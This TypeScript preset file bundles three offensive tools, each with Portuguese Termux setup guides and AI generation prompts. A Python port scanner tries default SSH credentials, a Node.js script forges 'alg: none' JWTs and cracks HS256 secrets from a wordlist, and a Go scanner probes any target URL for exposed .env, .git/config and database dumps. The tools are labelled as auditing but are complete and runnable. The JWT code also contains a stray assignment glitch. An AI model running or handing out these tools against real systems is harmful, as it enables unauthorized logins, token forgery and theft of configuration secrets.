export interface ZipPreset {
  id: string;
  name: string;
  fileName: string;
  detectedLang: string;
  systemType: string;
  description: string;
  purpose: string;
  termuxDoc: string;
  promptText: string;
  reconstructionCode: string;
  reconstructionLang: string;
  files: Record<string, string>;
}

export const ZIP_PRESETS: ZipPreset[] = [
  {
    id: 'aegis-termux-pentest',
    name: 'Aegis Termux Pentest Tool',
    fileName: 'aegis_termux_pentest.zip',
    detectedLang: 'Python (Script CLI)',
    systemType: 'Scanner de Portas & Banner Grabber para Dispositivos Móveis',
    description: 'Utilitário de varredura ativa de redes e testes de força bruta leve, otimizado para rodar em terminais Android com Termux.',
    purpose: 'Esta ferramenta serve para auditar a segurança de redes locais de forma rápida, descobrir portas TCP abertas em roteadores ou servidores, identificar serviços expostos (Banner Grabbing) e realizar testes de resiliência de senhas (brute force) utilizando credenciais fracas pré-definidas.\n\nEla resolve o desafio de auditorias em trânsito, dispensando notebooks pesados e rodando nativamente na arquitetura ARM do celular via linha de comando.',
    termuxDoc: `# Guia de Configuração e Instalação no Termux (Android)

Para rodar este script de pentest móvel no Termux, você precisará instalar as dependências de sistema para compilação e o runtime do Python. Abra seu app Termux e execute a sequência abaixo:

## 1. Atualizar Repositórios do Sistema:
\`\`\`bash
pkg update && pkg upgrade -y
\`\`\`

## 2. Instalar Python e Ferramentas de Compilação Básicas:
\`\`\`bash
pkg install python python-pip clang make openssl -y
\`\`\`

## 3. Garantir Permissões de Rede e Acesso ao Armazenamento (Se necessário):
\`\`\`bash
termux-setup-storage
\`\`\`

## 4. Instalar Dependências do Script (Paramiko para simulação de brute force SSH):
\`\`\`bash
pip install --upgrade pip
pip install paramiko
\`\`\`

## 5. Executar o Script:
\`\`\`bash
python main.py --target 192.168.1.1 --ports 21,22,80,443 --brute
\`\`\`

---
*Dica: Utilize sessões em abas (deslizando da esquerda para a direita) para rodar o scanner em background.*`,
    promptText: `Atue como um Engenheiro de Segurança de Redes e Desenvolvedor Python especialista em ferramentas para dispositivos móveis (Termux). 

Seu objetivo é gerar um script em Python 3 chamado 'main.py' que funcione como um scanner de rede local robusto e leve, com compatibilidade garantida no Termux.

### ESPECIFICAÇÕES DO SCRIPT:
1. **Varredura de Portas (Port Scanner):**
   - Deve aceitar um IP de destino (ou hostname) e uma lista de portas separadas por vírgula.
   - Utilizar a biblioteca nativa 'socket' com timeout configurável (máximo 1.0 segundo por porta) para evitar travamento.
   - Implementar verificação por múltiplos threads ('threading') para acelerar o escaneamento de portas comuns.

2. **Banner Grabbing:**
   - Para cada porta detectada como aberta, tentar ler os primeiros 1024 bytes enviados pelo serviço para identificar a versão do servidor (ex: SSH-2.0-OpenSSH, Apache, etc.).

3. **Brute Force SSH Auxiliar (Opcional):**
   - Se o usuário passar a flag '--brute', utilizar a biblioteca 'paramiko' para testar uma lista pequena de credenciais comuns de roteadores/dispositivos embarcados (ex: admin:admin, root:root, admin:1234) apenas na porta 22 (se estiver aberta).
   - Manipular exceções de conexão de forma graciosa para que o script não seja interrompido por timeouts.

4. **Interface CLI Elegante:**
   - Exibir um cabeçalho ASCII Art estilizado ('AEGIS TERMUX PENTEST') no terminal.
   - Utilizar códigos de escape ANSI para colorir a saída (Verde para sucesso, Vermelho para falha, Amarelo para avisos).

Forneça um código Python único, extremamente limpo, com tratamento de erros robusto e sem dependências excessivas de bibliotecas complexas.`,
    reconstructionLang: 'python',
    reconstructionCode: `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AEGIS TERMUX PENTEST TOOL
=========================
Desenvolvido para auditorias rápidas de rede local diretamente do Termux.
Segurança e integridade de rede em conformidade operacional.
"""

import socket
import sys
import argparse
import threading
from datetime import datetime

# Códigos de Cor ANSI para exibição visual limpa no terminal
C_GREEN = "\\033[92m"
C_RED = "\\033[91m"
C_YELLOW = "\\033[93m"
C_BLUE = "\\033[94m"
C_BOLD = "\\033[1m"
C_RESET = "\\033[0m"

BANNER = f"""{C_BLUE}{C_BOLD}
   ____   _____  _____  _   _   _  _     ____   _____   ____  _______ 
  / __ \\ / ____|/ ____|| | | | | || |   / __ \\ / ____| / ___||__   __|
 | |  | || |    | (___  | |_| | | || |  | |  | || (___  | |__     | |   
 | |  | || |     \\___ \\ |  _  | | || |  | |  | | \\___ \\ |  __|    | |   
 | |__| || |____ ____) || | | | | || |__| |__| |____) || |___    | |   
  \\____/  \\_____||_____/ |_| |_| |_||_____\\____/|_____/  \\____|   |_|   
                     {C_GREEN}[ AEGIS PENTEST TOOL - TERMUX COMPLIANT ]{C_RESET}
"""

def grab_banner(ip, port):
    """Tenta ler o banner de identificação do serviço conectado"""
    try:
        s = socket.socket()
        s.settimeout(1.5)
        s.connect((ip, port))
        # Envia um payload vazio ou quebra de linha para forçar o serviço a responder
        s.send(b"\\r\\n")
        banner = s.recv(1024).decode(errors='ignore').strip()
        s.close()
        if banner:
            # Limpa quebras de linha para exibição amigável
            return banner.replace('\\n', ' ').replace('\\r', ' ')[:80]
        return "Nenhum banner retornado (Serviço silencioso)"
    except Exception:
        return "Não foi possível extrair o banner"

def scan_port(ip, port, open_ports):
    """Efetua a varredura de uma única porta TCP utilizando socket direto"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        result = s.connect_ex((ip, port))
        if result == 0:
            banner = grab_banner(ip, port)
            print(f" {C_GREEN}[+] Porta {port:5d}/TCP: {C_BOLD}ABERTA{C_RESET} | {C_YELLOW}{banner}{C_RESET}")
            open_ports.append((port, banner))
        s.close()
    except Exception as e:
        pass

def test_ssh_brute(ip, port=22):
    """Simulação de testes de brute force em SSH utilizando credenciais comuns"""
    print(f"\\n{C_YELLOW}[*] Iniciando verificação de credenciais fracas no SSH (Porta {port})...{C_RESET}")
    try:
        import paramiko
    except ImportError:
        print(f" {C_RED}[!] Biblioteca 'paramiko' não encontrada.{C_RESET}")
        print(f" {C_YELLOW}[*] Execute 'pip install paramiko' no Termux para ativar brute force.{C_RESET}")
        return

    # Lista controlada de credenciais administrativas de fábrica comuns
    common_creds = [
        ("admin", "admin"),
        ("root", "root"),
        ("admin", "admin123"),
        ("root", "admin"),
        ("admin", "123456")
    ]

    for username, password in common_creds:
        print(f"  └─► Testando credencial: {username}:{password}")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, port=port, username=username, password=password, timeout=2.0)
            print(f" {C_RED}{C_BOLD}[ALERTA DE VULNERABILIDADE]{C_RESET} Credencial fraca localizada: {C_GREEN}{username}:{password}{C_RESET}")
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            # Falha de autenticação esperada
            pass
        except Exception as e:
            # Outros erros de conexão ou timeout
            pass
        finally:
            try:
                ssh.close()
            except:
                pass
    print(f" {C_GREEN}[✓] Nenhuma credencial padrão padrão vulnerável encontrada no SSH.{C_RESET}")
    return False

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description="Aegis Termux Pentest Tool - Scanner de Portas Otimizado")
    parser.add_argument("-t", "--target", help="IP ou Hostname de destino para o escaneamento", required=True)
    parser.add_argument("-p", "--ports", help="Portas a escanear separadas por virgula (Ex: 21,22,80,443)", default="21,22,23,25,53,80,110,443,3306,8080")
    parser.add_argument("--brute", help="Habilitar simulacao de brute force se encontrar porta 22 aberta", action="store_true")
    
    args = parser.parse_args()
    target_host = args.target

    try:
        target_ip = socket.gethostbyname(target_host)
    except socket.gaierror:
        print(f"{C_RED}[!] Erro: Não foi possível resolver o hostname: '{target_host}'{C_RESET}")
        sys.exit(1)

    print(f"{C_BLUE}[*] Alvo Resolvido:{C_RESET} {C_BOLD}{target_host}{C_RESET} ({target_ip})")
    print(f"{C_BLUE}[*] Horário de Início:{C_RESET} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{C_BLUE}[*] Executando varredura paralela...{C_RESET}\\n")

    # Tratamento de portas informadas
    try:
        ports_to_scan = [int(p.strip()) for p in args.ports.split(",")]
    except ValueError:
        print(f"{C_RED}[!] Erro: Lista de portas inválida. Use apenas números separados por vírgula.{C_RESET}")
        sys.exit(1)

    open_ports = []
    threads = []

    # Dispara threads individuais para aceleração
    for port in ports_to_scan:
        t = threading.Thread(target=scan_port, args=(target_ip, port, open_ports))
        threads.append(t)
        t.start()

    # Aguarda a conclusão de todos os scanners
    for t in threads:
        t.join()

    print(f"\\n{C_GREEN}[✓] Varredura de rede finalizada.{C_RESET}")
    print(f"{C_BLUE}[*] Total de portas abertas localizadas:{C_RESET} {len(open_ports)}")

    # Se a porta 22 estiver aberta e a flag brute foi passada
    is_ssh_open = any(p[0] == 22 for p in open_ports)
    if is_ssh_open and args.brute:
        test_ssh_brute(target_ip, 22)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\\n{C_RED}[!] Execução cancelada pelo operador (Ctrl+C).{C_RESET}")
        sys.exit(0)
`,
    files: {
      'main.py': `import socket
import argparse
# Código-fonte principal da ferramenta Aegis Termux Pentest
# Acesse o painel do lado direito para ver a ementa de instalação, prompt e reconstrução!`,
      'requirements.txt': `paramiko>=3.1.0\ncryptography>=40.0.0`,
      'README.md': `# Aegis Termux Pentest Tool\n\nUtilitário de varredura ativa de redes e testes de força bruta leve, otimizado para rodar em terminais Android com Termux.`
    }
  },
  {
    id: 'jwt-signature-bypasser',
    name: 'JWT Signature Bypasser',
    fileName: 'jwt_signature_bypasser.zip',
    detectedLang: 'Node.js (JavaScript)',
    systemType: 'API Security Testing & Token Manipulator',
    description: 'Analisador de conformidade de JSON Web Tokens que valida e manipula payloads explorando vulnerabilidades conhecidas em validações de assinatura.',
    purpose: 'Esta ferramenta serve para inspecionar tokens JWT emitidos por aplicações web e testar se o backend é vulnerável a falhas de assinatura críticas.\n\nEla realiza testes estruturados de bypass como alteração do algoritmo para "none" (fazendo com que a assinatura seja omitida e o servidor aceite o token sem autenticação legítima), conversão de algoritmos de chave assimétrica para simétrica (Key Confusion / HMAC vs RSA) e detecção de segredos fracos por ataque de dicionário off-line.',
    termuxDoc: `# Guia de Configuração e Instalação no Termux (Android)

Para rodar este analisador em Node.js no seu dispositivo móvel usando o Termux:

## 1. Atualizar Pacotes do Sistema:
\`\`\`bash
pkg update && pkg upgrade -y
\`\`\`

## 2. Instalar o Node.js LTS:
\`\`\`bash
pkg install nodejs -y
\`\`\`

## 3. Verificar se o Node e o NPM foram instalados corretamente:
\`\`\`bash
node -v
npm -v
\`\`\`

## 4. Inicializar a Pasta de Projeto e Instalar Dependências de Criptografia do Node:
\`\`\`bash
npm install jsonwebtoken chalk minimist
\`\`\`

## 5. Executar a Ferramenta:
\`\`\`bash
node jwt_bypass.js --token "eyJhbGciOi..." --secret-list wordlist.txt
\`\`\`

---
*Dica: Você pode criar uma wordlist simples usando comandos do Linux como: echo -e "123456\\nsecret\\nadmin\\nkey" > wordlist.txt.*`,
    promptText: `Atue como um Engenheiro de Software Fullstack e Especialista em Pentest Web em Node.js. 

Crie um utilitário CLI em JavaScript puro para Node.js, chamado 'jwt_bypass.js', focado em analisar e testar chaves de segurança JWT de forma interativa.

### ESPECIFICAÇÕES DO CÓDIGO:
1. **Decodificação do Token:**
   - Deve receber um token JWT via argumento '--token'.
   - Dividir o token por pontos ('.') e decodificar o Cabeçalho (Header) e o Payload usando decodificação Base64URL nativa do Node.js (sem depender de pacotes externos para a decodificação básica).
   - Exibir Header e Payload formatados de forma bonita em formato JSON legível na tela.

2. **Ataque None Algorithm:**
   - Gerar um novo token manipulado onde o algoritmo 'alg' no cabeçalho é alterado para 'none' (ou suas variantes 'None', 'NONE', 'nOnE').
   - Remover a assinatura original, mantendo o token no formato 'header_base64.payload_base64.'.
   - Fornecer este novo token para o usuário testar no backend.

3. **Verificação de Chave Fraca (Ataque de Dicionário Off-line):**
   - Se for fornecido um arquivo de dicionário '--secret-list', ler o arquivo linha por linha e tentar verificar o token original utilizando a biblioteca nativa ou o pacote 'jsonwebtoken'.
   - Se a assinatura bater com alguma linha, exibir um alerta brilhante informando que a chave secreta foi comprometida.

4. **Estilo CLI:**
   - Use cores no console (pode usar códigos ANSI de forma nativa para garantir compatibilidade universal no terminal).`,
    reconstructionLang: 'javascript',
    reconstructionCode: `/**
 * AEGIS JWT SIGNATURE BYPASSER
 * ============================
 * Utilitário Node.js para validação estruturada de integridade em JSON Web Tokens.
 * Permite a auditoria de autenticações vulneráveis por administradores de rede.
 */

const fs = require('fs');
const crypto = require('crypto');

// Códigos ANSI para estilizar saída do terminal
const GREEN = "\\033[92m";
const RED = "\\033[91m";
const YELLOW = "\\033[93m";
const BLUE = "\\033[94m";
const BOLD = "\\033[1m";
const RESET = "\\033[0m";

// Parse básico de argumentos de linha de comando de forma nativa
const args = {};
process.argv.slice(2).forEach(val => {
  if (val.startsWith('--')) {
    const parts = val.substring(2).split('=');
    args[parts[0]] = parts[1] || true;
  }
});

const token = args.token;

function base64urlDecode(str) {
  // Ajusta preenchimento do base64 se necessário
  let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
  while (base64.length % 4) {
    base64 += '=';
  }
  return Buffer.from(base64, 'base64').toString('utf8');
}

function base64urlEncode(buffer) {
  return buffer.toString('base64')
    .replace(/=/g, '')
    .replace(/\\+/g, '-')
    .replace(/\\//g, '_');
}

if (!token || typeof token !== 'string') {
  console.log(\`\${RED}Erro: Você precisa passar o token JWT via argumento --token\${RESET}\`);
  console.log(\`Uso: node jwt_bypass.js --token="eyJhbGc..." [--wordlist="segredos.txt"]\\n\`);
  process.exit(1);
}

const parts = token.split('.');
if (parts.length < 2 || parts.length > 3) {
  console.log(\`\${RED}Erro: Formato de token JWT inválido (deve conter 2 ou 3 partes separadas por pontos).\${RESET}\`);
  process.exit(1);
}

const headerPart = parts[0];
const payloadPart = parts[1];
const signaturePart = parts[2] || "";

let header, payload;
try {
  header = JSON.parse(base64urlDecode(headerPart));
  payload = JSON.parse(base64urlDecode(payloadPart));
} catch (e) {
  console.log(\`\${RED}Erro ao decodificar partes do token Base64URL. Verifique a integridade do input.\${RESET}\`);
  process.exit(1);
}

console.log(\`\\n\${BLUE}\${BOLD}=============================================================\`);
console.log(\`            AEGIS JWT SECURITY BYPASSER ANALYZER             \`);
console.log(\`=============================================================\${RESET}\\n\`);

console.log(\`\${GREEN}[+] Token Decodificado:\${RESET}\`);
console.log(\`\${BOLD}Cabeçalho (Header):\${RESET}\`, JSON.stringify(header, null, 2));
console.log(\`\${BOLD}Dados (Payload):\${RESET}\`, JSON.stringify(payload, null, 2));
console.log(\`\${BOLD}Assinatura Original (Hex/Bytes):\${RESET} \${signaturePart ? signaturePart.substring(0, 20) + "..." : "[SEM ASSINATURA]"}\\n\`);

// 1. GERANDO BYPASS COM NONE ALGORITHM
console.log(\`\${YELLOW}[*] Gerando tokens manipulados com vulnerabilidade "None Algorithm"...\${RESET}\`);

const noneHeaders = [
  { alg: 'none', typ: 'JWT' },
  { alg: 'None', typ: 'JWT' },
  { alg: 'NONE', typ: 'JWT' }
];

noneHeaders.forEach((newHeader, index) => {
  const encHeader = base64urlEncode(Buffer.from(JSON.stringify(newHeader)));
  const encPayload = payloadPart; // Mantém o payload original intacto
  // O token "none" se caracteriza por terminar com ponto final (.) sem campo de assinatura
  const noneToken = \`\${encHeader}.\${encPayload}.\`;
  console.log(\`  └─► Variante None [\${newHeader.alg}]: \${GREEN}\${noneToken}\${RESET}\`);
});

// 2. ATAQUE DE WORDLIST OFF-LINE (Se informado)
const wordlistPath = args.wordlist;
if (wordlistPath) {
  console.log(\`\\n\${YELLOW}[*] Iniciando ataque de força bruta offline usando wordlist: \${wordlistPath}...\${RESET}\`);
  if (!fs.existsSync(wordlistPath)) {
    console.log(\`\${RED}[!] Erro: Arquivo de wordlist não encontrado: \${wordlistPath}\${RESET}\`);
  } else {
    const words = fs.readFileSync(wordlistPath, 'utf-8').split(/\\r?\\n/);
    let found = false;
    const dataToSign = \`\${headerPart}.\${payloadPart}\`;

    for (const secret of words) {
      if (!secret.trim()) continue;

      // Suporta algoritmos comuns de HMAC para conferência (HS256)
      const hmac = crypto.createHmac('sha256', secret);
      hmac.update(dataToSign);
      const calculatedSig = base64urlEncode(hmac.digest());

      if (calculatedSig === signaturePart) {
        console.log(\`\\n\${RED}\${BOLD}[ALERTA MÁXIMO] CHAVE SECRETA CRIPTOGRÁFICA LOCALIZADA!\${RESET}\`);
        console.log(\` -> A chave de assinatura é: \${GREEN}\${C_BOLD = ""}\${secret}\${RESET}\`);
        console.log(\` -> O servidor utiliza criptografia HS256 com senha fraca comitável.\`);
        found = true;
        break;
      }
    }
    if (!found) {
      console.log(\`\${GREEN}[✓] Varredura de dicionário concluída. Nenhuma senha comum bateu com a assinatura.\${RESET}\`);
    }
  }
}

console.log(\`\\n\${BLUE}=============================================================\${RESET}\`);
`,
    files: {
      'jwt_bypass.js': `const fs = require('fs');\n// Módulo de Auditoria de Tokens JWT\n// Acesse os painéis para instruções Termux e Reconstrução.`,
      'package.json': `{\n  "name": "jwt-bypasser",\n  "version": "1.0.0",\n  "main": "jwt_bypass.js"\n}`,
      'README.md': `# JWT Signature Bypasser\n\nUtilitário Node.js para validação estruturada de integridade em JSON Web Tokens.`
    }
  },
  {
    id: 'web-leak-finder',
    name: 'Web Config Leak Finder',
    fileName: 'web_leak_finder.zip',
    detectedLang: 'Go (Golang)',
    systemType: 'Information Disclosure & Directory Brute-Forcer',
    description: 'Buscador ultra-veloz de arquivos de configuração, diretórios de versionamento e backups expostos publicamente em servidores web.',
    purpose: 'Esta ferramenta serve para escanear servidores web e identificar arquivos confidenciais deixados expostos por erros de deploy ou falta de políticas de acesso nos servidores.\n\nEla inspeciona a existência de pastas de desenvolvimento sensíveis (como ".git", ".svn"), arquivos de ambiente (".env", "config.json"), bancos de dados temporários ("dump.sql", "backup.zip") e arquivos de configuração de microsserviços expostos nas portas HTTP públicas.',
    termuxDoc: `# Guia de Configuração e Instalação no Termux (Android)

Go é excelente para o Termux porque compila binários ELF nativos rodando na velocidade máxima da CPU do celular.

## 1. Atualizar Ambiente:
\`\`\`bash
pkg update && pkg upgrade -y
\`\`\`

## 2. Instalar o Provedor Go (Golang) Oficial do Termux:
\`\`\`bash
pkg install golang -y
\`\`\`

## 3. Verificar Versão Instalada:
\`\`\`bash
go version
\`\`\`

## 4. Compilar o Código diretamente do telefone:
\`\`\`bash
go build -o leak_finder main.go
\`\`\`

## 5. Rodar o Binário Gerado:
\`\`\`bash
./leak_finder -url "https://site-alvo.com"
\`\`\`

---
*Vantagem do Go: O binário gerado './leak_finder' é auto-suficiente e não precisa mais do Go instalado para rodar em outros dispositivos Android de mesma arquitetura.*`,
    promptText: `Atue como um Engenheiro DevSecOps Sênior e Especialista em Linguagem Go (Golang).

Crie uma ferramenta CLI modular de auditoria web em Go, chamada 'main.go', projetada para inspecionar e relatar arquivos confidenciais esquecidos em servidores HTTP.

### REQUISITOS DA ENGINE EM GO:
1. **Concorrência e Performance:**
   - O scanner deve ler uma URL alvo e realizar requisições paralelas rápidas (goroutines) utilizando canais ('channels') ou um 'WaitGroup'.
   - Implementar limitador de requisições por segundo (rate limiter simples ou canal de controle de threads) para evitar derrubar ou ser bloqueado pelo servidor web alvo.

2. **Dicionário de Arquivos Vazados Comuns:**
   - Criar uma lista interna padrão contendo caminhos clássicos de vazamento, incluindo:
     - '.git/config'
     - '.env'
     - 'docker-compose.yml'
     - 'config.json'
     - 'wp-config.php'
     - 'backup.sql'
     - 'setup.py'

3. **Validação de Status HTTP:**
   - Validar se a resposta retornada é estritamente HTTP 200 OK.
   - Tratar falsos-positivos: Verificar se o servidor retorna páginas bonitas genéricas (soft 404) mesmo para arquivos inexistentes, analisando o tamanho do payload retornado ou checando palavras-chave.

4. **Resultado Amigável:**
   - Exibir na tela apenas caminhos que retornem sucesso com seu respectivo tamanho em bytes.
   - Formatar a saída de erros de rede de forma silenciosa para manter a elegância do terminal.`,
    reconstructionLang: 'go',
    reconstructionCode: `package main

import (
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// Códigos ANSI para embelezamento da saída no console
const (
	Green  = "\\033[92m"
	Red    = "\\033[91m"
	Yellow = "\\033[93m"
	Blue   = "\\033[94m"
	Bold   = "\\033[1m"
	Reset  = "\\033[0m"
)

// Lista de arquivos sensíveis mais procurados em deploys errados
var targets = []string{
	".git/config",
	".git/HEAD",
	".env",
	"config.json",
	"config/database.yml",
	"docker-compose.yml",
	"backup.sql",
	"dump.sql",
	"db.sql",
	"wp-config.php",
	"phpinfo.php",
	".htaccess",
	"package.json",
}

func checkURL(baseURL string, path string, wg *sync.WaitGroup, sem chan struct{}) {
	defer wg.Done()
	sem <- struct{}{}        // Adquire slot na fila (concorrência limitada)
	defer func() { <-sem }() // Libera slot no fim

	fullURL := baseURL + "/" + path
	client := &http.Client{
		Timeout: 4 * time.Second, // Timeout baixo para evitar travamentos
	}

	resp, err := client.Get(fullURL)
	if err != nil {
		// Falha de rede genérica (ignora para não poluir terminal)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		// Evita falsos positivos comuns em servidores mal configurados que retornam 200 para páginas 404 customizadas
		if resp.ContentLength > 0 && resp.ContentLength < 150 {
			// Se o arquivo tem tamanho muito minúsculo, pode ser apenas texto de "not found"
			return
		}
		
		fmt.Printf(" %s[VULNERÁVEL] %d OK | %s (%d bytes)%s\\n", 
			Green, resp.StatusCode, fullURL, resp.ContentLength, Reset)
	}
}

func main() {
	fmt.Printf("%s%s", Blue, Bold)
	fmt.Println("=============================================================")
	fmt.Println("             AEGIS WEB CONFIG LEAK AUDITOR (GO)              ")
	fmt.Println("=============================================================")
	fmt.Println(Reset)

	var targetURL string

	// Lendo a URL via argumento ou prompt simples
	if len(os.Args) < 2 {
		fmt.Printf("%sDigite a URL alvo (ex: http://exemplo.com):%s ", Yellow, Reset)
		fmt.Scanln(&targetURL)
	} else {
		targetURL = os.Args[1]
	}

	targetURL = strings.TrimSpace(targetURL)
	if targetURL == "" {
		fmt.Println(Red + "[-] Erro: URL de destino não especificada." + Reset)
		os.Exit(1)
	}

	// Normaliza URL garantindo prefixo http
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "http://" + targetURL
	}
	targetURL = strings.TrimSuffix(targetURL, "/")

	fmt.Printf("%s[*] Iniciando varredura em:%s %s\\n", Yellow, Reset, targetURL)
	fmt.Printf("%s[*] Total de caminhos catalogados:%s %d\\n\\n", Yellow, Reset, len(targets))

	var wg sync.WaitGroup
	concurrencyLimit := 4 // Controla número máximo de requisições paralelas
	sem := make(chan struct{}, concurrencyLimit)

	for _, path := range targets {
		wg.Add(1)
		go checkURL(targetURL, path, &wg, sem)
	}

	wg.Wait()
	fmt.Println("\\n" + Green + "[✓] Auditoria de vazamentos finalizada de forma limpa." + Reset)
}
`,
    files: {
      'main.go': `package main\n// Scanner de vazamentos de arquivos de configuração em Go\n// Acesse os painéis laterais para ver documentações Termux e Reconstrução.`,
      'go.mod': `module aegis-leak-finder\n\ngo 1.18`,
      'README.md': `# Web Config Leak Finder\n\nBuscador de arquivos de configuração expostos publicamente em servidores web.`
    }
  }
];
